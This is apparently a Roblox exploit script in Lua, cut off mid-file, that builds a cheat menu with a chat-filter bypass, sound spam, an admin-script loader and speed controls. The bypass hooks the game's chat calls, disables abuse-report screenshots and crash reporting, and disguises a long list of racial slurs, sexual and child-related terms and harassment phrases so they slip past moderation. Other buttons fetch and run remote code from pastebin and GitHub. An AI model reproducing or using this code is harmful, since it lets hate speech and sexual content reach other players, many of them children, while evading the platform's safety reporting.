

local args = {
	[1] = "Thanks For Buying Heaven!...[📜]",
	[2] = "All"
}

game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))

wait (0.5)


local Es = Instance.new("ScreenGui")
local Drag = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local UIGradient = Instance.new("UIGradient")
local Glow = Instance.new("ImageLabel")
local Frame = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local _1 = Instance.new("Frame")
local UICorner_3 = Instance.new("UICorner")
local Frame_2 = Instance.new("Frame")
local UICorner_4 = Instance.new("UICorner")
local ChatBypass = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local ChatBypass_2 = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")
local _2 = Instance.new("Frame")
local UICorner_7 = Instance.new("UICorner")
local Frame_3 = Instance.new("Frame")
local UICorner_8 = Instance.new("UICorner")
local SoundSpammer = Instance.new("TextButton")
local UICorner_9 = Instance.new("UICorner")
local TextLabel_2 = Instance.new("TextLabel")
local _3 = Instance.new("Frame")
local UICorner_10 = Instance.new("UICorner")
local Frame_4 = Instance.new("Frame")
local UICorner_11 = Instance.new("UICorner")
local Noclip = Instance.new("TextButton")
local UICorner_12 = Instance.new("UICorner")
local TextLabel_3 = Instance.new("TextLabel")
local _4 = Instance.new("Frame")
local UICorner_13 = Instance.new("UICorner")
local TextLabel_4 = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local _5 = Instance.new("Frame")
local UICorner_14 = Instance.new("UICorner")
local TextLabel_5 = Instance.new("TextLabel")
local Hub1 = Instance.new("TextButton")
local UICorner_15 = Instance.new("UICorner")
local Hub2 = Instance.new("ImageButton")
local TextButton_3 = Instance.new("TextButton")
local UICorner_16 = Instance.new("UICorner")
local Frame_5 = Instance.new("Frame")
local UICorner_17 = Instance.new("UICorner")
local TextButton_4 = Instance.new("TextButton")
local TextButton_5 = Instance.new("TextButton")
local HUB = Instance.new("Frame")
local UICorner_18 = Instance.new("UICorner")
local UIGradient_2 = Instance.new("UIGradient")
local Glow_2 = Instance.new("ImageLabel")
local ESP = Instance.new("TextButton")
local UICorner_19 = Instance.new("UICorner")
local SPY = Instance.new("TextButton")
local UICorner_20 = Instance.new("UICorner")
local Frame_6 = Instance.new("Frame")
local UICorner_21 = Instance.new("UICorner")
local TextButton_6 = Instance.new("TextButton")
local HARKED = Instance.new("TextButton")
local UICorner_22 = Instance.new("UICorner")
local VALUE = Instance.new("TextBox")
local UICorner_23 = Instance.new("UICorner")
local CLOSE = Instance.new("TextButton")
local UICorner_24 = Instance.new("UICorner")
local UICorner_25 = Instance.new("UICorner")

--Properties:

Es.Name = "Es"
Es.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Es.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Es.ResetOnSpawn = false

Drag.Name = "Drag"
Drag.Parent = Es
Drag.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Drag.Draggable = true
Drag.Position = UDim2.new(0.357317001, 1, 0.196827099, -4)
Drag.Size = UDim2.new(0, 337, 0, 445)
Drag.Active = true
Drag.Draggable = true

UICorner.Parent = Drag

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.75, Color3.fromRGB(170, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient.Parent = Drag

Glow.Name = "Glow"
Glow.Parent = Drag
Glow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Glow.BackgroundTransparency = 1.000
Glow.Position = UDim2.new(0, -15, 0, -16)
Glow.Size = UDim2.new(1, 30, 1.00707376, 30)
Glow.ZIndex = -2
Glow.Image = "rbxassetid://5028857084"
Glow.ScaleType = Enum.ScaleType.Slice
Glow.SliceCenter = Rect.new(24, 24, 276, 276)

Frame.Parent = Drag
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BackgroundTransparency = 0.350
Frame.Position = UDim2.new(0.0652818978, 0, 0.187624946, 0)
Frame.Size = UDim2.new(0, 293, 0, 344)

UICorner_2.Parent = Frame

_1.Name = "1"
_1.Parent = Frame
_1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
_1.BackgroundTransparency = 0.350
_1.Position = UDim2.new(0.0375426635, 0, 0.0250967387, 0)
_1.Size = UDim2.new(0, 268, 0, 60)

UICorner_3.Parent = _1

Frame_2.Parent = _1
Frame_2.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Frame_2.Position = UDim2.new(0.6473189, 0, 0.169509292, 0)
Frame_2.Size = UDim2.new(0, 82, 0, 39)

UICorner_4.CornerRadius = UDim.new(1, 0)
UICorner_4.Parent = Frame_2

ChatBypass.Name = "ChatBypass"
ChatBypass.Parent = Frame_2
ChatBypass.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ChatBypass.Position = UDim2.new(0.463, 0, 0.0769999996, 0)
ChatBypass.Size = UDim2.new(0, 33, 0, 32)
ChatBypass.Visible = false
ChatBypass.Font = Enum.Font.SourceSans
ChatBypass.Text = ""
ChatBypass.TextColor3 = Color3.fromRGB(0, 255, 0)
ChatBypass.TextSize = 14.000


UICorner_5.CornerRadius = UDim.new(1, 0)
UICorner_5.Parent = ChatBypass

ChatBypass_2.Name = "ChatBypass"
ChatBypass_2.Parent = Frame_2
ChatBypass_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ChatBypass_2.Position = UDim2.new(0.073170729, 0, 0.0769230798, 0)
ChatBypass_2.Size = UDim2.new(0, 33, 0, 32)
ChatBypass_2.Font = Enum.Font.SourceSans
ChatBypass_2.Text = ""
ChatBypass_2.TextColor3 = Color3.fromRGB(0, 0, 0)
ChatBypass_2.TextSize = 14.000
ChatBypass_2.MouseButton1Click:Connect(function()
	ChatBypass_2:TweenPosition(UDim2.new(0.463, 0,0.077, 0))
	Frame_2.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
	ChatBypass.Visible = true
	ChatBypass_2.Visible = false

	wait(1)

	if setfflag then
		local Chars = {};

		for i = ("a"):byte(), ("z"):byte() do
			table.insert(Chars, string.char(i));
		end;

		for i = ("A"):byte(), ("Z"):byte() do
			table.insert(Chars, string.char(i));
		end;

		for i = ("0"):byte(), ("9"):byte() do
			table.insert(Chars, string.char(i));
		end;

		function genstring(length)
			local Str = "";

			for i=1, length do
				local Random = math.random(1, #Chars);
				Str = Str .. Chars[Random];
			end
			return Str;
		end
		setfflag("DFStringCrashPadUploadToBacktraceToBacktraceBaseUrl", genstring(math.random(1,25)))
		setfflag("DFIntCrashUploadToBacktracePercentage", genstring(math.random(1,35)))
		setfflag("DFStringCrashUploadToBacktraceBlackholeToken", genstring(math.random(1,28)))
		setfflag("DFStringCrashUploadToBacktraceWindowsPlayerToken", genstring(math.random(1,250)))
	end
	setfflag("AbuseReportScreenshot", "False")
	setfflag("AbuseReportScreenshotPercentage", "0")
	while not game:IsLoaded() or not game:GetService("CoreGui") or not game:GetService("Players").LocalPlayer or not game:GetService("Players").LocalPlayer.PlayerGui do wait() end

	local chatSettings = require(game:GetService("Chat").ClientChatModules.ChatSettings)
	local chatFrame = game:GetService("Players").LocalPlayer.PlayerGui.Chat.Frame

	chatSettings.WindowResizable = true
	chatSettings.WindowDraggable = true

	chatFrame.ChatChannelParentFrame.Visible=true
	chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
	spawn(function()
		pcall(function()
			local CloneFunction = clonefunction
			local CheckCaller = CloneFunction(checkcaller)
			local HookFunction = CloneFunction(hookfunction)
			local LocalPlayer = game.Players.PlayerAdded:wait()

			local PostMessage = require(LocalPlayer:WaitForChild("PlayerScripts", 1/0):WaitForChild("ChatScript", 1/0):WaitForChild("ChatMain", 1/0)).MessagePosted
			getgenv().MessageEvent = Instance.new("BindableEvent")

			local OldFunctionHook
			local PostMessageHook = function(self, msg)
				if not CheckCaller() and self == PostMessage then
					MessageEvent:Fire(msg)
					return
				end
				return OldFunctionHook(self, msg)
			end
			OldFunctionHook = HookFunction(PostMessage.fire, PostMessageHook)
		end)
	end)

	Y = hookmetamethod(game,"__namecall",function(self,...)
		local args = {...};
		local checkargs = {};
		local method = getnamecallmethod()
		local last
		if method == "Fire" or method == "FireServer" then
			if self.Name == "MessagePosted" or self.Name == "SayMessageRequest"   then
				last = args[1]
				--print(args[1].. last)
				if last == args[1] then
					return  Y(self,...)
				else
					return
				end
				if method == "ReportAbuse" and self == game.Players.LocalPlayer then
					return
				end
			end
		end  
		return Y(self,...)
	end)

	local Bypasses = {
		[" "] = "\226\129\165\226\129\165\226\129\165\226\129\165\226\129\165\226\129\165 \226\129\165\226\129\165\226" ..
			"\129\165\226\129\165\226\129\165\226\129\165",
		["ass"] = "as{{aieixzvzx:s}}",
		["asshole"] = "a{{aieixzvzx:sshole}}",
		["bitch"] = "bit{{aieixzvzx:ch}}",
		["cock"] = "co{{aieixzvzx:ck}}",
		["cocks"] = "co{{aieixzvzx:cks}}",
		["cunt"] = "cu{{aieixzvzx:nt}}",
		["dyke"] = "dy{{aieixzvzx:ke}}",
		["liberal"] = "libe{{aieixzvzx:ral}}",
		["liberals"] = "libe{{aieixzvzx:rals}}",
		["libtard"] = "libt{{aieixzvzx:ard}}",
		["libtards"] = "libt{{aieixzvzx:ards}}",
		["democrat"] = "demo{{aieixzvzx:crat}}",
		["democrats"] = "demo{{aieixzvzx:crats}}",
		["trump"] = "tru{{aieixzvzx:mp}}",
		["biden"] = "bi{{aieixzvzx:den}}",
		["republican"] = "repub{{aieixzvzx:lican}}",
		["republicans"] = "repub{{aieixzvzx:licans}}",

		["faggot"] = "fa{{aieixzvzx:ggot}}",
		["faggots"] = "fa{{aieixzvzx:ggots}}",
		["fag"] = "fa{{aieixzvzx:g}}",
		["fags"] = "fa{{aieixzvzx:gs}}",
		["tf"] = "t{{aieixzvzx:f}}",
		["wdf"] = "wd{{aieixzvzx:f}}",
		["lick"] = "li{{aieixzvzx:ck}}",
		["lemme"] = "lem{{aieixzvzx:me}}",
		["niggas"] = "nig{{aieixzvzx:gas}}",
		["ive"] = "i{{aieixzvzx:ve}}",
		["been"] = "be{{aieixzvzx:en}}",
		["hi"] = "fa{{aieixzvzx:lls}}",
		["dudes"] = "du{{aieixzvzx:des}}",
		["men"] = "me{{aieixzvzx:n}}",
		["guys"] = "gu{{aieixzvzx:ys}}",
		["girls"] = "gi{{aieixzvzx:rls}}",
		["woman"] = "wom{{aieixzvzx:an}}",
		["women"] = "wom{{aieixzvzx:en}}",
		["female"] = "fe{{aieixzvzx:male}}",
		["females"] = "fe{{aieixzvzx:males}}",
		["ladies"] = "la{{aieixzvzx:dies}}",
		["fuck"] = "fu{{aieixzvzx:ck}}", 
		["fucked"] = "fu{{aieixzvzx:cked}}",
		["fucks"] = "fu{{aieixzvzx:cks}}", 
		["fucking"] = "fu{{aieixzvzx:ck}}in{{aieixzvzx:g}}",
		["gaylord"] = "gayl{{aieixzvzx:ord}}",
		["kike"] = "ki{{aieixzvzx:ke}}",
		["motherfucker"] = "motherf{{aieixzvzx:ucker}}",
		["nigga"] = "ni{{aieixzvzx:gga}}",
		["nigger"] = "ni{{aieixzvzx:gger}}",
		["nigger!"] = "ni{{aieixzvzx:gger!}}",
		["nigger!!"] = "ni{{aieixzvzx:gger!!}}",
		["nigger!!!"] = "ni{{aieixzvzx:gger!!!}}",
		["niggers!"] = "ni{{aieixzvzx:ggers!}}",
		["niggers!!"] = "ni{{aieixzvzx:ggers!!}}",
		["niggers!!!"] = "ni{{aieixzvzx:ggers!!!}}",
		["piss"] = "p{{aieixzvzx:iss}}",
		["penis"] = "pe{{aieixzvzx:nis}}",
		["pussy"] = "pu{{aieixzvzx:ssy}}",
		["shit"] = "sh{{aieixzvzx:it}}",
		["shitted"] = "sh{{aieixzvzx:itted}}",
		["shithead"] = "sh{{aieixzvzx:ithead}}",
		["slut"] = "sl{{aieixzvzx:ut}}",
		["whore"] = "who{{aieixzvzx:re}}",
		["discord"] = "disco{{aieixzvzx:rd}}",
		["kys"] = "k{{aieixzvzx:ys}}",
		["kill"] = "ki{{aieixzvzx:ll}}",
		["whore"] = "who{{aieixzvzx:re}}",
		["nig"] = "n{{aieixzvzx:ig}}",
		["slut"] = "s{{aieixzvzx:lut}}",
		["gay"] = "g{{aieixzvzx:ay}}",
		["stfu"] = "st{{aieixzvzx:fu}}",
		["niggers"] = "ni{{aieixzvzx:ggers}}",
		["niggerz"] = "ni{{aieixzvzx:ggerz}}",
		["niggas"] = "ni{{aieixzvzx:ggas}}",
		["niggaz"] = "ni{{aieixzvzx:ggaz}}",
		["shitty"] = "sh{{aieixzvzx:itty}}",
		["omg"] = "om{{aieixzvzx:g}}",
		["nasty"] = "nas{{aieixzvzx:ty}}",
		["you"] = "y{{aieixzvzx:ou}}",
		["whores"] = "who{{aieixzvzx:res}}",
		["nigs"] = "n{{aieixzvzx:igs}}",
		["sluts"] = "s{{aieixzvzx:luts}}",
		["hi"] = "h{{aieixzvzx:i}}",
		["yo"] = "y{{aieixzvzx:o}}",
		["suck"] = "s{{aieixzvzx:uck}}",
		["sucking"] = "s{{aieixzvzx:ucking}}",
		["sucka"] = "s{{aieixzvzx:ucka}}",
		["suckin"] = "s{{aieixzvzx:uckin}}",
		["sugma"] = "s{{aieixzvzx:ugma}}",
		["ligma"] = "l{{aieixzvzx:igma}}",
		["ball"] = "ba{{aieixzvzx:ll}}",
		["balls"] = "ba{{aieixzvzx:lls}}",
		["ballin"] = "ba{{aieixzvzx:llin}}",
		["the"] = "t{{aieixzvzx:he}}",
		["virgin"] = "vir{{aieixzvzx:gin}}",
		["who"] = "wh{{aieixzvzx:o}}",
		["when"] = "w{{aieixzvzx:hen}}",
		["what"] = "w{{aieixzvzx:hat}}",
		["nig"] = "n{{aieixzvzx:ig}}",
		["my"] = "m{{aieixzvzx:y}}",
		["rape"] = "rap{{aieixzvzx:e}}",
		["raped"] = "rap{{aieixzvzx:ed}}",
		["raper"] = "rap{{aieixzvzx:er}}",
		["raping"] = "rap{{aieixzvzx:ing}}",
		["rapist"] = "rap{{aieixzvzx:ist}}",
		["molest"] = "mole{{aieixzvzx:st}}",
		["molester"] = "mole{{aieixzvzx:ster}}",
		["molesting"] = "mole{{aieixzvzx:sting}}",
		["molesta"] = "mole{{aieixzvzx:sta}}",
		["molested"] = "mole{{aieixzvzx:sted}}",
		["moleste"] = "mole{{aieixzvzx:ste}}",
		["moles"] = "mole{{aieixzvzx:s}}",
		["OnlineDaters"] = "Online{{aieixzvzx:Daters}}",
		["slutty"] = "s{{aieixzvzx:lutty}}",
		["youre"] = "yo{{aieixzvzx:ure}}",
		["you're"] = "yo{{aieixzvzx:u're}}",
		["terrible"] = "ter{{aieixzvzx:rible}}",
		["dogshit"] = "dogsh{{aieixzvzx:it}}",
		["are"] = "ar{{aieixzvzx:e}}",
		["dogshit"] = "dogsh{{aieixzvzx:it}}",
		["doing"] = "do{{aieixzvzx:ing}}",
		["today"] = "to{{aieixzvzx:day}}",
		["sex"] = "s{{aieixzvzx:ex}}",
		["sexy"] = "se{{aieixzvzx:xy}}",
		["mom"] = "mo{{aieixzvzx:m}}",
		["momma"] = "mo{{aieixzvzx:mma}}",
		["mommy"] = "mom{{aieixzvzx:my}}",
		["daddy"] = "da{{aieixzvzx:ddy}}",
		["dad"] = "da{{aieixzvzx:d}}",
		["papi"] = "pa{{aieixzvzx:pi}}",
		["mami"] = "mam{{aieixzvzx:i}}",
		["mama"] = "ma{{aieixzvzx:ma}}",
		["dada"] = "da{{aieixzvzx:da}}",
		["papa"] = "pa{{aieixzvzx:pa}}",
		["blm"] = "b{{aieixzvzx:lm}}",
		["black"] = "b{{aieixzvzx:lack}}",
		["white"] = "wh{{aieixzvzx:ite}}",
		["negro"] = "ne{{aieixzvzx:gro}}",
		["negros"] = "ne{{aieixzvzx:gros}}",
		["cotton"] = "cot{{aieixzvzx:ton}}",
		["picker"] = "pic{{aieixzvzx:ker}}",
		["picking"] = "pic{{aieixzvzx:king}}",
		["picka"] = "pic{{aieixzvzx:ka}}",
		["pic"] = "pi{{aieixzvzx:c}}",
		["picture"] = "pi{{aieixzvzx:cture}}",
		["feet"] = "fe{{aieixzvzx:et}}",
		["pics"] = "pi{{aieixzvzx:cs}}",
		["child"] = "chi{{aieixzvzx:ld}}",
		["children"] = "chi{{aieixzvzx:ldren}}",
		["baby"] = "ba{{aieixzvzx:by}}",
		["babies"] = "bab{{aieixzvzx:ies}}",
		["porn"] = "po{{aieixzvzx:rn}}",
		["videos"] = "vid{{aieixzvzx:eos}}",
		["video"] = "vid{{aieixzvzx:eo}}",
		["kid"] = "ki{{aieixzvzx:d}}",
		["kids"] = "ki{{aieixzvzx:ds}}",
		["toddler"] = "tod{{aieixzvzx:dler}}",
		["toddlers"] = "tod{{aieixzvzx:dlers}}",
		["fat"] = "fa{{aieixzvzx:t}}",
		["fatty"] = "fa{{aieixzvzx:tty}}",
		["tiktok"] = "ti{{aieixzvzx:ktok}}",
		["tt"] = "t{{aieixzvzx:t}}",
		["youtube"] = "you{{aieixzvzx:tube}}",
		["yt"] = "y{{aieixzvzx:t}}",
		["wtf"] = "wt{{aieixzvzx:f}}",
		["swear"] = "sw{{aieixzvzx:ear}}",
		["to"] = "t{{aieixzvzx:o}}",
		["tit"] = "t{{aieixzvzx:it}}",
		["tits"] = "t{{aieixzvzx:its}}",
		["titties"] = "t{{aieixzvzx:itties}}",
		["yourself"] = "yo{{aieixzvzx:urself}}",
		["get"] = "g{{aieixzvzx:et}}",
		["hang"] = "h{{aieixzvzx:ang}}",
		["hanging"] = "h{{aieixzvzx:anging}}",
		["give"] = "g{{aieixzvzx:ive}}",
		["head"] = "h{{aieixzvzx:ead}}",
		["pussies"] = "pu{{aieixzvzx:ssies}}",
		["slave"] = "sl{{aieixzvzx:ave}}",
		["slaves"] = "sl{{aieixzvzx:aves}}",
		["facefuck"] = "facefu{{aieixzvzx:ck}}",
		["facefucking"] = "facefu{{aieixzvzx:ck}}in{{aieixzvzx:g}}",
		["muslim"] = "mu{{aieixzvzx:sl}}i{{aieixzvzx:m}}",
		["dick"] = "d{{aieixzvzx:i}}c{{aieixzvzx:k}}",
		["suck"] = "s{{aieixzvzx:u}}c{{aieixzvzx:k}}",
		["much"] = "mu{{aieixzvzx:ch}}",
		["queer"] = "que{{aieixzvzx:er}}",
		["can"] = "ca{{aieixzvzx:n}}",
		["take"] = "ta{{aieixzvzx:ke}}",
		["in"] = "i{{aieixzvzx:n}}",
		["im"] = "i{{aieixzvzx:m}}",
		["masturbating"] = "mastu{{aieixzvzx:rbating}}",
		["masturbate"] = "mastu{{aieixzvzx:rbate}}",
		["masturbation"] = "mastu{{aieixzvzx:rbaition}}",
		["ejaculate"] = "ejacu{{aieixzvzx:late}}",
		["ejaculation"] = "ejacu{{aieixzvzx:lation}}",
		["ejaculating"] = "ejacu{{aieixzvzx:lating}}",
		["currently"] = "curr{{aieixzvzx:ently}}",
		["beating"] = "beat{{aieixzvzx:ing}}",
		["wife"] = "wi{{aieixzvzx:fe}}",
		["behead"] = "be{{aieixzvzx:head}}",
		["beheading"] = "be{{aieixzvzx:heading}}",
		["married"] = "mar{{aieixzvzx:ried}}",
		["love"] = "lo{{aieixzvzx:ve}}",
		["loving"] = "lo{{aieixzvzx:ving}}",
		["meat"] = "mea{{aieixzvzx:t}}",
		["sip"] = "si{{aieixzvzx:p}}",
		["sipping"] = "sip{{aieixzvzx:ping}}",
		["drinking"] = "drin{{aieixzvzx:king}}",
		["drunk"] = "dru{{aieixzvzx:nk}}",
		["drank"] = "dr{{aieixzvzx:ank}}",
		["beer"] = "be{{aieixzvzx:er}}",
		["meaty"] = "me{{aieixzvzx:aty}}",
		["sack"] = "sa{{aieixzvzx:ck}}",
		["cum"] = "cu{{aieixzvzx:m}}",
		["cumming"] = "cu{{aieixzvzx:mming}}",
		["came"] = "ca{{aieixzvzx:me}}",
		["moan"] = "moa{{aieixzvzx:n}}",
		["moaning"] = "moa{{aieixzvzx:ning}}",
		["beg"] = "be{{aieixzvzx:g}}",
		["spank"] = "spa{{aieixzvzx:nk}}",
		["spanking"] = "spa{{aieixzvzx:nking}}",
		["slap"] = "sl{{aieixzvzx:ap}}",
		["slapping"] = "sla{{aieixzvzx:pping}}",
		["nutsack"] = "n{{aieixzvzx:ut}}sa{{aieixzvzx:ck}}",
		["nut"] = "n{{aieixzvzx:ut}}",
		["nip"] = "n{{aieixzvzx:ip}}",
		["nips"] = "n{{aieixzvzx:ips}}",
		["nipple"] = "n{{aieixzvzx:ipple}}",
		["nipples"] = "n{{aieixzvzx:ipples}}",
		["nipslip"] = "n{{aieixzvzx:ipslip}}",
		["nippleslip"] = "n{{aieixzvzx:ippleslip}}",
		["nutting"] = "n{{aieixzvzx:utting}}",
		["ballsack"] = "b{{aieixzvzx:all}}sa{{aieixzvzx:ck}}",
		["fucking"] = "fu{{aieixzvzx:ck}}in{{aieixzvzx:g}}",
		["chink"] = "chi{{aieixzvzx:nk}}",
		["chinks"] = "chi{{aieixzvzx:nks}}",
		["horny"] = "h{{aieixzvzx:o}}r{{aieixzvzx:ny}}",
	}

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Remote = ReplicatedStorage:FindFirstChild("SayMessageRequest", true)

	local ChatBypass; ChatBypass = hookmetamethod(Remote, "__namecall", function(self, ...)
		local Method = getnamecallmethod()
		local Arguments = {...}

		if self == Remote and Method == "FireServer" then
			local Message = Arguments[1]
			local Split = Message:split(" ")
			local FinalMessage = ""

			for _, x in next, Split do
				for _, Bypass in next, Bypasses do
					if x:lower() == _ then
						if x:upper() ~= x then
							Message = Message:gsub(x, Bypass)
							FinalMessage = Message .. " ng"
						else
							Message = Message:gsub(x, Bypass):upper()
							FinalMessage = Message:gsub(x, Bypass):upper() .. " ng"
						end
					end
				end
			end

			if FinalMessage ~= "" then
				Arguments[1] = FinalMessage
			end

			return ChatBypass(self, unpack(Arguments))
		end
		return ChatBypass(self, ...)
	end)
end)

UICorner_6.CornerRadius = UDim.new(1, 0)
UICorner_6.Parent = ChatBypass_2

TextLabel.Parent = _1
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(-0.0421909094, 0, 0.0784511566, 0)
TextLabel.Size = UDim2.new(0, 200, 0, 50)
TextLabel.Font = Enum.Font.GothamBold
TextLabel.Text = "HeavenBypassV3"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 19.000

_2.Name = "2"
_2.Parent = Frame
_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
_2.BackgroundTransparency = 0.350
_2.Position = UDim2.new(0.0375426635, 0, 0.218084425, 0)
_2.Size = UDim2.new(0, 268, 0, 60)

UICorner_7.Parent = _2

Frame_3.Parent = _2
Frame_3.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Frame_3.Position = UDim2.new(0.6473189, 0, 0.169509292, 0)
Frame_3.Size = UDim2.new(0, 82, 0, 39)

UICorner_8.CornerRadius = UDim.new(1, 0)
UICorner_8.Parent = Frame_3

SoundSpammer.Name = "SoundSpammer"
SoundSpammer.Parent = Frame_3
SoundSpammer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SoundSpammer.Position = UDim2.new(0.073170729, 0, 0.0769230798, 0)
SoundSpammer.Size = UDim2.new(0, 33, 0, 32)
SoundSpammer.Font = Enum.Font.SourceSans
SoundSpammer.Text = ""
SoundSpammer.TextColor3 = Color3.fromRGB(0, 0, 0)
SoundSpammer.TextSize = 14.000
SoundSpammer.MouseButton1Click:Connect(function()
	SoundSpammer:TweenPosition(UDim2.new(0.476, 0,0.077, 0))
	Frame_3.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
	wait(1)
	if game.SoundService.RespectFilteringEnabled == false then
		while wait(0.2) do
			for i,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Sound") then
					v:Play()
				end
			end
		end
	else
		loadstring(game:HttpGetAsync("https://pastebin.com/raw/Ts8TSAZN", 0, true))()
		wait(0.2)
		game.StarterGui:SetCore("SendNotification", {
			Title = "SoundRespective Is Gay Fr Fr"; -- the title 
			Text = "NO ENABLE SORRY"; -- what the text says 
			Duration = 5; -- how long the notification should in secounds
		})
	end
end)

UICorner_9.CornerRadius = UDim.new(1, 0)
UICorner_9.Parent = SoundSpammer

TextLabel_2.Parent = _2
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(-0.0430696011, 0, 0.0796296299, 0)
TextLabel_2.Size = UDim2.new(0, 200, 0, 50)
TextLabel_2.Font = Enum.Font.GothamBold
TextLabel_2.Text = "SoundSpam"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 20.000

_3.Name = "3"
_3.Parent = Frame
_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
_3.BackgroundTransparency = 0.350
_3.Position = UDim2.new(0.0409556329, 0, 0.411679804, 0)
_3.Size = UDim2.new(0, 268, 0, 60)

UICorner_10.Parent = _3

Frame_4.Parent = _3
Frame_4.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Frame_4.Position = UDim2.new(0.6473189, 0, 0.169509292, 0)
Frame_4.Size = UDim2.new(0, 82, 0, 39)

UICorner_11.CornerRadius = UDim.new(1, 0)
UICorner_11.Parent = Frame_4

Noclip.Name = "Noclip"
Noclip.Parent = Frame_4
Noclip.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Noclip.Position = UDim2.new(0.073170729, 0, 0.0769230798, 0)
Noclip.Size = UDim2.new(0, 33, 0, 32)
Noclip.Font = Enum.Font.SourceSans
Noclip.Text = ""
Noclip.TextColor3 = Color3.fromRGB(0, 0, 0)
Noclip.TextSize = 14.000
Noclip.MouseButton1Click:Connect(function()
	Noclip:TweenPosition(UDim2.new(0.476, 0,0.077, 0))
	Frame_4.BackgroundColor3 = Color3.fromRGB(0, 255, 0)

	wait(1)
	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

UICorner_12.CornerRadius = UDim.new(1, 0)
UICorner_12.Parent = Noclip

TextLabel_3.Parent = _3
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.Position = UDim2.new(-0.0438718796, 0, 0.0703703612, 0)
TextLabel_3.Size = UDim2.new(0, 200, 0, 50)
TextLabel_3.Font = Enum.Font.GothamBold
TextLabel_3.Text = "Admin"
TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.TextSize = 20.000

_4.Name = "4"
_4.Parent = Frame
_4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
_4.BackgroundTransparency = 0.350
_4.Position = UDim2.new(0.0409556329, 0, 0.8012833, 0)
_4.Size = UDim2.new(0, 268, 0, 60)

UICorner_13.Parent = _4

TextLabel_4.Parent = _4
TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.BackgroundTransparency = 1.000
TextLabel_4.Position = UDim2.new(-0.0438718796, 0, 0.0703703612, 0)
TextLabel_4.Size = UDim2.new(0, 200, 0, 50)
TextLabel_4.Font = Enum.Font.GothamBold
TextLabel_4.Text = "WalkSpeed"
TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.TextSize = 20.000

TextButton.Name = "+"
TextButton.Parent = _4
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BackgroundTransparency = 1.000
TextButton.Position = UDim2.new(0.634328365, 0, 0.13333334, 0)
TextButton.Size = UDim2.new(0, 53, 0, 43)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "+"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true
TextButton.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = game.Players.LocalPlayer.Character.Humanoid.WalkSpeed +1
end)

TextButton_2.Name = "-"
TextButton_2.Parent = _4
TextButton_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.BackgroundTransparency = 1.000
TextButton_2.Position = UDim2.new(0.789109826, 0, 0.120370507, 0)
TextButton_2.Size = UDim2.new(0, 41, 0, 42)
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "-"
TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.TextScaled = true
TextButton_2.TextSize = 14.000
TextButton_2.TextWrapped = true
TextButton_2.MouseButton1Click:Connect(function()
	game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = game.Players.LocalPlayer.Character.Humanoid.WalkSpeed -1
end)

_5.Name = "5"
_5.Parent = Frame
_5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
_5.BackgroundTransparency = 0.350
_5.Position = UDim2.new(0.0409556329, 0, 0.605865836, 0)
_5.Size = UDim2.new(0, 268, 0, 60)

UICorner_14.Parent = _5

TextLabel_5.Parent = _5
TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.BackgroundTransparency = 1.000
TextLabel_5.Position = UDim2.new(-0.0438718796, 0, 0.0703703612, 0)
